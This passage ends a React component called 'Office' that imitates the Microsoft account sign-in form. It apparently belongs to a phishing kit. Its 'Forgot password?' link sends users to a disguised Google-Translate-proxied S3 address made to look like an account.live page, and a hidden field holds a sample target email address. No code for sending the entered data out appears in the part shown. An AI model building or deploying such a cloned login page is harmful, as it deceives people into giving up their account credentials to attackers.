                                    role="link"
                                    href="https://89908-s3-eu--west--3-amazonaws-com.translate.goog/vsp/outief4OLVfRFm/account.live/ResetPassword.aspx?wreply=ps:///login.srf?wa%3Dwsignin1.0%26rpsnv%3D13%26ct%3D1566923446%26rver%3D7.0.6737.0%26wp%3DMBI_SSL%26wreply%3Dps%253a%252f%252foutlook.live%252fowa%252f%253fRpsCsrfState%253df5452d81-3246-f237-e173-456076ebedf8%26id%3D292841%26aadredir%3D1%26CBCXT%3Dout%26lw%3D1%26fl%3Ddob%252cflname%252cwld%26cobrandid%3D90015%26contextid%3DA0C70092CA03244A%26bk%3D1566923447&id=292841&uiflavor=web&cobrandid=90015&uaid=5f941d7ba535498dbb70dfaff7d36338&mkt=EN-US&lc=1033&bk=1566923447&_x_tr_sl=en&_x_tr_tl=ja&_x_tr_hl=en-GB&_x_tr_pto=ajax,op"
                                    data-bind="text: str['CT_PWD_STR_ForgotPwdLink_Text'], href: svr.p, click: resetPassword_onClick"
                                  >
                                    Forgot password?
                                  </a>
                                </div>
                                {/* ko if: allowPhoneDisambiguation */}
                                {/* /ko */}
                                {/* ko ifnot: useEvictedCredentials */}
                                {/* ko component: { name: "cred-switch-link-control",
                            params: {
                                serverData: svr,
                                username: username,
                                availableCreds: availableCreds,
                                flowToken: flowToken,
                                currentCred: { credType: 1 } },
                            event: {
                                switchView: credSwitchLink_onSwitchView,
                                redirect: onRedirect,
                                setPendingRequest: credSwitchLink_onSetPendingRequest,
                                updateFlowToken: credSwitchLink_onUpdateFlowToken } } */}
                                {/*  */}
                                <div className="form-group">
                                  {/* ko if: credentialCount > 1 || (credentialCount === 1 && (showForgotUsername || selectedCredShownOnlyOnPicker)) */}
                                  {/* /ko */}
                                  {/* ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) */}
                                  {/* /ko */}
                                  {/* ko if: credentialCount === 0 && showForgotUsername */}
                                  {/* /ko */}
                                </div>
                                {/* ko if: credLinkError */}
                                {/* /ko */}
                                {/* /ko */}
                                {/* ko if: evictedCreds.length > 0 */}
                                {/* /ko */}
                                {/* /ko */}
                                {/* ko if: showChangeUserLink */}
                                {/* /ko */}
                              </div>
                            </div>
                          </div>
                        </div>
                        <div
                          className="row"
                          data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"
                        >
                          <div
                            data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.f,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: false } }"
                          >
                            <div
                              className="col-xs-24 no-padding-left-right button-container"
                              data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin }"
                            >
                              {/* ko if: isSecondaryButtonVisible */}
                              {/* /ko */}
                              <div className="inline-block">
                                {/* type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 */}
                                <div id="f1" style={{ display: "block" }}>
                                  <input
                                    type="submit"
                                    disabled={submited.status}
                                    className="btn btn-block btn-primary"
                                    defaultValue="Sign in"
                                  />
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                      {/* ko if: tenantBranding.BoilerPlateText */}
                      {/* /ko */}
                    </form>
                  </div>
                  <input
                    type="hidden"
                    name="dm"
                    id="dm"
                    defaultValue="test@align.ae"
                  />
                </div>
              </div>
            </div>
            {/* /ko */}
          </div>
        </div>
      </div>

      <div id="idPartnerPL"></div>
    </Fragment>
  );
}

export default Office;
